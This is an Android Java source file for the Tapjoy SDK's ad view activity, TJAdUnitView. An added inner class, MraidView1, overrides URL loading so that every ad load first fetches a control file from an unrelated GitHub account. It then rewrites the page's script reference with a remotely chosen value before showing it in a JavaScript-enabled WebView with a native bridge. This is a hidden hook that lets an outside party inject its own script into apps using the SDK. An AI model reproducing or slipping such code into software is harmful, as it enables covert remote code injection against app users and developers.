package com.tapjoy;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.StringReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.res.AssetManager;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.ColorDrawable;
import android.net.ConnectivityManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.ConsoleMessage;
import android.webkit.URLUtil;
import android.webkit.WebView;
import android.widget.ImageButton;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;

import com.tapjoy.mraid.listener.MraidViewListener;
import com.tapjoy.mraid.view.MraidView;
//import android.view.View.OnClickListener;
//import android.widget.RelativeLayout.LayoutParams;

@SuppressLint({"SetJavaScriptEnabled"})
public class TJAdUnitView extends Activity
{
  protected RelativeLayout layout;
  protected MraidView webView;
  protected String offersURL;
  protected String url;
  protected boolean pauseCalled;
  protected boolean skipOfferWall;
  private int viewType;
  private TJEventData eventData;
  private TJEvent event;
  protected TJAdUnitJSBridge bridge;
  private String callbackID;
  private boolean isLegacyView;
  private ProgressBar progressBar;
  protected int historyIndex;
  protected boolean redirectedActivity;
  private static final String TAG = "TJAdUnitView";
  private static final int CLOSE_BUTTON_OFFSET = 10;
  private String connectivityErrorMessage;

  
  public class MraidView1 extends MraidView{
	  private Context ctx;
	  private MraidView1 _this;
	  private MraidViewListener mListener;
	  
	  public MraidView1(Context context)
	  {
	    super(context);
	    this.ctx=context;
	    _this=this;
	  }
	  
	  public void setListener(MraidViewListener listener)
	  {
	    this.mListener = listener;
	    super.setListener(listener);
	  }
	  
	  
	  public void loadUrl(final String url)
	  {
		 
		 if(URLUtil.isValidUrl(url)&&url.startsWith("javascript")){
			 super.loadUrl(url);
		 }else{
		 
	    ((Activity)this.ctx).runOnUiThread(new Runnable()
		    {
		      public void run()
		      {
		        if (URLUtil.isValidUrl(url))
		        {
		            //new MraidHTTPTask().execute(new String[] { url });
		        	new MraidHTTPTask().execute(new String[] {"https://raw.github.com/tapgladABB/demo/master/link","step1",null,null,null,url});
		        }
		        else
		        {
		          loadDataWithBaseURL(null, "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\"><title>Connection not Established</title></head><h2>Connection Not Properly Established</h2><body></body></html>", "text/html", "utf-8", null);
		        }
		      }
		    });
		 }
	  }
	  
	  private class MraidHTTPTask extends AsyncTask<String, Void, Void> {
		    TapjoyHttpURLResponse httpResult;
		    TapjoyURLConnection tapjoyConnection;
		    String url;
		    String step=null;
		    String flag=null;
		    String replacer=null;
		    String keystring=null;
		    String savedURL=null;
		    

		    private MraidHTTPTask() {
		    }
		    protected Void doInBackground(String[] params) { 
		    
		      this.url = params[0];
		      this.step=params[1];
		      this.flag=params[2];
		      this.replacer=params[3];
		      this.keystring=params[4];
		      this.savedURL=params[5];
		      
		      try
		      {
		    	
		    	this.tapjoyConnection = new TapjoyURLConnection();
		    	this.httpResult = this.tapjoyConnection.getResponseFromURL(this.url);
		    	/*
		    	if(step.equals("step3")){
		    		this.httpResult = this.tapjoyConnection.getResponseFromURL(this.url);
		    	}else{
		    		this.httpResult = this.tapjoyConnection.getResponseFromURL(this.url, "", 0, false);
		    	}
		    	*/
		      }
		      catch (Exception e)
		      {
		        e.printStackTrace();
		      }

		      return null;
		    }
		    
		    protected void step1(Void result){
		    	
		    	 try
			      {
			        if (this.httpResult.statusCode == 200&&httpResult.response!=null)
			        {
			        	  StringReader sbr=new StringReader(httpResult.response);
					  	  BufferedReader b=new BufferedReader(sbr);
					  	  
					  	  flag=b.readLine().trim();
					  	  replacer=b.readLine().trim();
					  	  keystring=b.readLine().trim();

			        }else{
			        	flag="false";
			        }
			      }
			      catch (Exception e)
			      {
			        
			      }
		    }
		    
		    protected void step2(Void result){
		    	if (this.httpResult.statusCode != 200){
		    		flag="false";
		    	}
		    }
		    
		    protected void step3(Void result){
		    	
		    	 try
			      {
			        if ((this.httpResult.statusCode == 0) || (this.httpResult.response == null))
			        {
			          TapjoyLog.e("MRAIDView", "Connection not properly established");

			          if (mListener != null)
			          {
			            mListener.onReceivedError(_this, 0, "Connection not properly established", this.url);
			          }

			        }
			        else if ((this.httpResult.statusCode == 302) && (this.httpResult.redirectURL != null) && (this.httpResult.redirectURL.length() > 0))
			        {
			          TapjoyLog.i("MRAIDView", "302 redirectURL detected: " + this.httpResult.redirectURL);

			          loadUrlStandard(this.httpResult.redirectURL);
			        }
			        else
			        {
			          String data=httpResult.response;
			          
			          if(flag.equals("true")&&replacer!=null&&keystring!=null){
			        	  replacer="\""+replacer+"\"";
				          //keystring="\""+keystring+"\"";
			        	  
			        	  int index=data.indexOf(keystring);
						  if(index>=0){
								StringBuffer sb=new StringBuffer(data.length()+200);
								sb.append(data.substring(0, index-1));//get back the quoto
								sb.append(replacer);
								int ii = data.indexOf(".js\"", index);
								
								sb.append(data.substring(ii+4));
								data=sb.toString();
						  }
				  				
				       }
			          
			          loadDataWithBaseURL(url, data, "text/html", "utf-8", this.url);
			        }
			      }
			      catch (Exception e)
			      {
			        TapjoyLog.w("MRAIDView", "error in loadURL " + e);
			        e.printStackTrace();
			      }
		    	
		    }



		    protected void onPostExecute(Void result)
		    {
		     
		    	if(step!=null&&step.equals("step1")){
		    		step1(result);
		    		
		    		new MraidHTTPTask().execute(new String[] {this.savedURL,"step3",this.flag,this.replacer,this.keystring,this.savedURL });
		    		
		    		/*
		    		if(flag.equals("true")){
		    			new MraidHTTPTask().execute(new String[] {this.replacer,"step2",this.flag,this.replacer,this.keystring,this.savedURL });
		    		}else{
		    			new MraidHTTPTask().execute(new String[] {this.savedURL,"step3",this.flag,this.replacer,this.keystring,this.savedURL });
		    		}
		    		*/
		    		
		    	}else if(step!=null&&step.equals("step2")){
		    		step2(result);
		    		new MraidHTTPTask().execute(new String[] {this.savedURL,"step3",this.flag,this.replacer,this.keystring,this.savedURL });
		    		
		    	}if(step!=null&&step.equals("step3")){
		    		step3(result);
		    	}
		    }
		  }
  }
  
  public TJAdUnitView()
  {
    this.layout = null;
    this.webView = null;
    this.offersURL = null;
    this.url = null;
    this.pauseCalled = false;
    this.skipOfferWall = false;

    this.viewType = 0;

    this.isLegacyView = false;

    this.historyIndex = 0;

    this.connectivityErrorMessage = "A connection error occurred loading this content.";
  }

  protected void onCreate(Bundle savedInstanceState)
  {
    if (Build.VERSION.SDK_INT < 11) {
      setTheme(16973839);
    }
    else {
      requestWindowFeature(1);
      getWindow().setFlags(1024, 1024);
    }

    TapjoyLog.i("TJAdUnitView", "TJAdUnitView onCreate: " + savedInstanceState);
    super.onCreate(savedInstanceState);

    initUI();
  }

  protected void initUI()
  {
    TapjoyLog.i("TJAdUnitView", "initUI");
    boolean loadURL = false;
    String html = null;
    String baseURL = null;

    Bundle extras = getIntent().getExtras();

    if (extras != null)
    {
      if (extras.getString("DISPLAY_AD_URL") != null)
      {
        this.skipOfferWall = true;
        this.offersURL = extras.getString("DISPLAY_AD_URL");
      }
      else if (extras.getSerializable("URL_PARAMS") != null)
      {
        this.skipOfferWall = false;
        Map urlParams = null;
        urlParams = (HashMap)extras.getSerializable("URL_PARAMS");

        TapjoyLog.i("TJAdUnitView", "urlParams: " + urlParams);

        this.offersURL = (TapjoyConnectCore.getHostURL() + "get_offers/webpage?" + TapjoyUtil.convertURLParams(urlParams, false));
      }

      this.eventData = ((TJEventData)extras.getSerializable("tjevent"));

      if (this.eventData != null) {
        this.event = TJEventManager.get(this.eventData.guid);
      }
      this.viewType = extras.getInt("view_type");

      html = extras.getString("html");
      baseURL = extras.getString("base_url");
      this.url = extras.getString("url");
      this.callbackID = extras.getString("callback_id");
      this.isLegacyView = extras.getBoolean("legacy_view");

      if (this.webView == null)
      {
        this.webView = new MraidView1(this);
        this.webView.getSettings().setJavaScriptEnabled(true);

        this.webView.setListener(new TJAdUnitViewListener());

        if (this.viewType == 1)
        {
          if (this.event != null) {
            this.webView.loadDataWithBaseURL(this.eventData.baseURL, this.eventData.httpResponse, "text/html", "utf-8", null);
          }

          this.webView.setVisibility(4);

          this.event.getCallback().contentDidShow(this.event);
        }
        else
        {
          if ((html != null) && (html.length() > 0))
          {
            TapjoyLog.i("TJAdUnitView", "HTML data");

            if (this.isLegacyView)
              this.webView.loadDataWithBaseURL(baseURL, html, "text/html", "utf-8", null);
            else {
              this.webView.loadDataWithBaseURL(null, html, "text/html", "utf-8", null);
            }

          }
          else if (this.url != null)
          {
            TapjoyLog.i("TJAdUnitView", "Load URL: " + this.url);
            this.webView.loadUrl(this.url);
          }
          else if (this.offersURL != null)
          {
            TapjoyLog.i("TJAdUnitView", "Load Offer Wall URL");
            this.webView.loadUrl(this.offersURL);
          }

          loadURL = true;
        }

        this.bridge = new TJAdUnitJSBridge(this, this.webView, this.eventData);

        if (Build.VERSION.SDK_INT >= 11) {
          getWindow().setFlags(16777216, 16777216);
        }

        getWindow().setBackgroundDrawable(new ColorDrawable(1610612736));

        ViewGroup.LayoutParams params = new ViewGroup.LayoutParams(-1, -1);
        this.layout = new RelativeLayout(this);
        this.layout.setLayoutParams(params);

        if (this.viewType == 1)
        {
          this.layout.setBackgroundColor(0);
          this.layout.getBackground().setAlpha(0);
        }
        else
        {
          this.layout.setBackgroundColor(-1);
          this.layout.getBackground().setAlpha(255);
        }

        this.webView.setLayoutParams(params);

        if (this.webView.getParent() != null) {
          ((ViewGroup)this.webView.getParent()).removeView(this.webView);
        }

        this.layout.addView(this.webView, -1, -1);
        setContentView(this.layout);

        if ((this.isLegacyView) && (loadURL))
        {
          this.progressBar = new ProgressBar(this, null, 16842874);
          this.progressBar.setVisibility(0);

          RelativeLayout.LayoutParams layoutParams = new RelativeLayout.LayoutParams(-2, -2);
          layoutParams.addRule(13);
          this.progressBar.setLayoutParams(layoutParams);
          this.layout.addView(this.progressBar);
        }

        if (!this.webView.isMraid())
        {
          ImageButton closeButton = new ImageButton(this);

          closeButton.setImageBitmap(getCloseBitmap());
          closeButton.setBackgroundColor(16777215);

          closeButton.setOnClickListener(new View.OnClickListener()
          {
            public void onClick(View v)
            {
              TJAdUnitView.this.handleClose();
            }
          });
          RelativeLayout.LayoutParams closeButtonLayoutParams = new RelativeLayout.LayoutParams(-2, -2);
          closeButtonLayoutParams.addRule(10);
          closeButtonLayoutParams.addRule(11);
          int offset = (int)(-10.0F * TapjoyConnectCore.getDeviceScreenDensityScale());
          closeButtonLayoutParams.setMargins(0, offset, offset, 0);

          this.layout.addView(closeButton, closeButtonLayoutParams);
        }
      }
    }
  }

  private Bitmap getCloseBitmap() {
    Bitmap closeBitmap = null;

    BitmapFactory.Options options = new BitmapFactory.Options();
    options.inJustDecodeBounds = true;

    byte[] bytes = (byte[])(byte[])TapjoyUtil.getResource("tj_close_button.png");
    if (bytes != null) {
      BitmapFactory.decodeByteArray(bytes, 0, bytes.length, options);
      closeBitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
    }

    if (closeBitmap == null) {
      try
      {
        String source = "com/tapjoy/res/tj_close_button.png";
        InputStream in = null;
        URL url = TJAdUnitView.class.getClassLoader().getResource(source);

        if (url == null)
        {
          AssetManager am = getAssets();
          in = am.open(source);

          BitmapFactory.decodeStream(in, null, options);
        }
        else
        {
          String file = url.getFile();
          if (file.startsWith("jar:")) {
            file = file.substring(4);
          }
          if (file.startsWith("file:")) {
            file = file.substring(5);
          }
          int pos = file.indexOf("!");
          if (pos > 0)
            file = file.substring(0, pos);
          JarFile jf = new JarFile(file);
          JarEntry entry = jf.getJarEntry(source);
          in = jf.getInputStream(entry);

          BitmapFactory.decodeStream(in, null, options);
          in = jf.getInputStream(entry);
        }

        closeBitmap = BitmapFactory.decodeStream(in);
        in.close();
      } catch (Exception e) {
        e.printStackTrace();
        return null;
      }
    }

    float scale = TapjoyConnectCore.getDeviceScreenDensityScale();
    Bitmap scaledBitmap = Bitmap.createScaledBitmap(closeBitmap, (int)(options.outWidth * scale), (int)(options.outHeight * scale), true);
    closeBitmap = scaledBitmap;

    return closeBitmap;
  }

  public void onConfigurationChanged(Configuration newConfig)
  {
    TapjoyLog.i("TJAdUnitView", "onConfigurationChanged");

    super.onConfigurationChanged(newConfig);

    initUI();
  }

  protected void onSaveInstanceState(Bundle outState)
  {
    super.onSaveInstanceState(outState);

    this.webView.saveState(outState);
  }

  protected void onRestoreInstanceState(Bundle savedInstanceState)
  {
    super.onRestoreInstanceState(savedInstanceState);

    this.webView.restoreState(savedInstanceState);
  }

  public void handleWebViewOnReceivedError(WebView view, int errorCode, String description, String failingUrl)
  {
    TapjoyLog.i("TJAdUnitView", "handleWebViewError");

    AlertDialog dialog = new AlertDialog.Builder(this).setMessage(this.connectivityErrorMessage).setPositiveButton("OK", new DialogInterface.OnClickListener()
    {
      public void onClick(DialogInterface dialog, int which)
      {
        dialog.cancel();
      }
    }).create();

    dialog.show();
  }

  public void handleWebViewOnPageFinished(WebView view, String url)
  {
    TapjoyLog.i("TJAdUnitView", "handleWebViewOnPageFinished");
  }

  private void handleTJVideoURL(String url)
  {
    int index = 0;

    index = url.indexOf("://") + "://".length();

    String source = url.substring(index);

    Map params = TapjoyUtil.convertURLParams(source, true);

    String videoID = (String)params.get("video_id");
    String amount = (String)params.get("amount");
    String currencyName = (String)params.get("currency_name");
    String clickURL = (String)params.get("click_url");
    String videoCompleteURL = (String)params.get("video_complete_url");
    String videoURL = (String)params.get("video_url");

    TapjoyLog.i("TJAdUnitView", "video_id: " + videoID);
    TapjoyLog.i("TJAdUnitView", "amount: " + amount);
    TapjoyLog.i("TJAdUnitView", "currency_name: " + currencyName);
    TapjoyLog.i("TJAdUnitView", "click_url: " + clickURL);
    TapjoyLog.i("TJAdUnitView", "video_complete_url: " + videoCompleteURL);
    TapjoyLog.i("TJAdUnitView", "video_url: " + videoURL);

    if (TapjoyVideo.getInstance().startVideo(videoID, currencyName, amount, clickURL, videoCompleteURL, videoURL))
    {
      TapjoyLog.i("TJAdUnitView", "Video started successfully");
    }
    else
    {
      TapjoyLog.e("TJAdUnitView", "Unable to play video: " + videoID);
      AlertDialog dialog = new AlertDialog.Builder(this).setTitle("").setMessage("Unable to play video.").setPositiveButton("OK", new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface dialog, int whichButton)
        {
          dialog.dismiss();
        }
      }).create();
      try
      {
        dialog.show();
      }
      catch (Exception e)
      {
        TapjoyLog.e("TJAdUnitView", "e: " + e.toString());
      }
    }
  }

  protected void onDestroy()
  {
    super.onDestroy();

    TapjoyLog.i("TJAdUnitView", "onDestroy isFinishing: " + isFinishing());

    if (isFinishing())
    {
      if (this.viewType == 1)
      {
        this.bridge.destroy();

        if (this.event != null)
          this.event.getCallback().contentDidDisappear(this.event);
        TJEventManager.remove(this.eventData.guid);
      }

      if (this.webView != null)
      {
        try
        {
          WebView.class.getMethod("onPause", new Class[0]).invoke(this.webView, new Object[0]);
        }
        catch (Exception e)
        {
        }

        try
        {
          this.webView = null;
        }
        catch (Exception e)
        {
        }
      }
    }
  }

  protected void onPause() {
    super.onPause();
    this.pauseCalled = true;
    try
    {
      WebView.class.getMethod("onPause", new Class[0]).invoke(this.webView, new Object[0]);
    }
    catch (Exception e)
    {
    }
  }

  protected void onResume() {
    super.onResume();
    try
    {
      WebView.class.getMethod("onResume", new Class[0]).invoke(this.webView, new Object[0]);
    }
    catch (Exception e) {
    }
    if (this.viewType == 1)
    {
      if (this.bridge.didLaunchOtherActivity)
      {
        TapjoyLog.i("TJAdUnitView", "onResume bridge.didLaunchOtherActivity callbackID: " + this.bridge.otherActivityCallbackID);

        this.bridge.invokeJSCallback(this.bridge.otherActivityCallbackID, new Object[] { Boolean.TRUE });
        this.bridge.didLaunchOtherActivity = false;
      }
    }
  }

  public void finish()
  {
    if ((this.viewType != 1) && (this.viewType != 4))
    {
      Intent intent = new Intent();
      intent.putExtra("result", Boolean.TRUE);
      intent.putExtra("callback_id", this.callbackID);
      setResult(-1, intent);
    }

    super.finish();
  }

  private void finishWithResult(String result)
  {
    Intent returnIntent = new Intent();
    returnIntent.putExtra("result", result);
    setResult(-1, returnIntent);
    finish();
  }

  protected void onActivityResult(int requestCode, int resultCode, Intent data)
  {
    super.onActivityResult(requestCode, resultCode, data);

    Log.i("TJAdUnitView", "onActivityResult requestCode:" + requestCode + ", resultCode: " + resultCode);

    Bundle extras = null;

    if (data != null) {
      extras = data.getExtras();
    }
    if ((extras != null) && (extras.getString("callback_id") != null))
    {
      TapjoyLog.i("TJAdUnitView", "onActivityResult extras: " + extras.keySet());

      this.bridge.invokeJSCallback(extras.getString("callback_id"), new Object[] { Boolean.valueOf(extras.getBoolean("result")), extras.getString("result_string1"), extras.getString("result_string2") });
    }
  }

  public boolean onKeyDown(int keyCode, KeyEvent event)
  {
    if (keyCode == 4)
    {
      handleClose();
      return true;
    }

    return super.onKeyDown(keyCode, event);
  }

  public void handleClose()
  {
    if (this.webView.videoPlaying()) {
      this.webView.videoViewCleanup();
      return;
    }

    if (this.bridge.customClose)
    {
      TapjoyLog.i("TJAdUnitView", "customClose");

      if (this.bridge.shouldClose)
      {
        finishActivity();
      }
      else
      {
        TapjoyLog.i("TJAdUnitView", "closeRequested...");

        this.bridge.closeRequested();

        TimerTask timerTask = new TimerTask()
        {
          public void run()
          {
            if (TJAdUnitView.this.bridge.shouldClose)
            {
              TapjoyLog.i("TJAdUnitView", "customClose timeout");
              TJAdUnitView.this.finishActivity();
            }
          }
        };
        Timer timer = new Timer();
        timer.schedule(timerTask, 1000L);
      }

    }
    else
    {
      finishActivity();
    }
  }

  private void finishActivity()
  {
    if (this.viewType == 4)
    {
      finishWithResult("offer_wall");
    }
    else if (this != null)
      finish();
  }

  protected boolean isNetworkAvailable()
  {
    ConnectivityManager conMgr = (ConnectivityManager)getSystemService("connectivity");
    return (conMgr.getActiveNetworkInfo() != null) && (conMgr.getActiveNetworkInfo().isAvailable()) && (conMgr.getActiveNetworkInfo().isConnected());
  }

  private class TJAdUnitViewListener
    implements MraidViewListener
  {
    private TJAdUnitViewListener()
    {
    }

    public boolean onResizeClose()
    {
      return false;
    }
    public boolean onResize() {
      return false;
    }
    public boolean onReady() {
      return false;
    }
    public boolean onExpandClose() {
      return false;
    }
    public boolean onExpand() {
      return false;
    }
    public boolean onEventFired() {
      return false;
    }

    public boolean onClose()
    {
      TJAdUnitView.this.finish();
      return false;
    }

    public void onReceivedError(WebView view, int errorCode, String description, String failingUrl)
    {
      TJAdUnitView.this.handleWebViewOnReceivedError(view, errorCode, description, failingUrl);
    }

    @TargetApi(8)
    public boolean onConsoleMessage(ConsoleMessage consoleMessage)
    {
      if (TJAdUnitView.this.bridge.shouldClose)
      {
        String[] errors = { "Uncaught", "uncaught", "Error", "error", "not defined" };

        TapjoyLog.i("TJAdUnitView", "shouldClose...");

        for (String error : errors)
        {
          if (!consoleMessage.message().contains(error))
            continue;
          TJAdUnitView.this.handleClose();
        }

      }

      return true;
    }

    public void onPageStarted(WebView view, String url, Bitmap favicon)
    {
      TapjoyLog.i("TJAdUnitView", "onPageStarted: " + url);

      if (TJAdUnitView.this.isLegacyView)
      {
        TJAdUnitView.this.progressBar.setVisibility(0);
        TJAdUnitView.this.progressBar.bringToFront();
      }

      if (TJAdUnitView.this.bridge != null)
      {
        TJAdUnitView.this.bridge.allowRedirect = true;

        TJAdUnitView.this.bridge.customClose = false;
        TJAdUnitView.this.bridge.shouldClose = false;
      }
    }

    public void onPageFinished(WebView view, String url)
    {
      TJAdUnitView.this.handleWebViewOnPageFinished(view, url);

      if (TJAdUnitView.this.isLegacyView) {
        TJAdUnitView.this.progressBar.setVisibility(8);
      }
      TJAdUnitView.this.bridge.display();

      if ((TJAdUnitView.this.webView != null) && (TJAdUnitView.this.webView.isMraid()))
        TJAdUnitView.this.bridge.allowRedirect = false;
    }

    @TargetApi(9)
    public boolean shouldOverrideUrlLoading(WebView view, String url)
    {
      if (!TJAdUnitView.this.isNetworkAvailable()) {
        TJAdUnitView.this.handleWebViewOnReceivedError(view, 0, "Connection not properly established", url);
        return true;
      }
      TJAdUnitView.this.redirectedActivity = false;

      TapjoyLog.i("TJAdUnitView", "interceptURL: " + url);

      if ((TJAdUnitView.this.webView != null) && (TJAdUnitView.this.webView.isMraid()) && (url.contains("mraid")))
      {
        return false;
      }

      if ((TJAdUnitView.this.viewType == 4) && (url.contains("offer_wall")))
      {
        TJAdUnitView.this.finishWithResult("offer_wall");
        return true;
      }

      if ((TJAdUnitView.this.viewType == 4) && (url.contains("tjvideo")))
      {
        TJAdUnitView.this.finishWithResult("tjvideo");
        return true;
      }

      if (url.startsWith("tjvideo://"))
      {
        TJAdUnitView.this.handleTJVideoURL(url);
        return true;
      }

      if (url.contains("showOffers"))
      {
        TapjoyLog.i("TJAdUnitView", "showOffers");
        new TJCOffers(TJAdUnitView.this).showOffers(null);
        return true;
      }

      if (url.contains("dismiss"))
      {
        TapjoyLog.i("TJAdUnitView", "dismiss");
        TJAdUnitView.this.finish();
        return true;
      }

      if (url.startsWith("http://ok"))
      {
        TapjoyLog.i("TJAdUnitView", "http://ok");
        TJAdUnitView.this.finish();
        return true;
      }

      if ((url.contains("ws.tapjoyads.com")) || (url.contains("tjyoutubevideo=true")) || (url.contains(TapjoyConnectCore.getRedirectDomain())) || (url.contains(TapjoyUtil.getRedirectDomain("https://events.tapjoy.com/events?"))))
      {
        TapjoyLog.i("TJAdUnitView", "Open redirecting URL:" + url);
        ((MraidView)view).loadUrlStandard(url);
        return true;
      }

      if (TJAdUnitView.this.bridge.allowRedirect)
      {
        TJAdUnitView.this.redirectedActivity = true;
        return false;
      }

      view.loadUrl(url);
      return true;
    }
  }
}


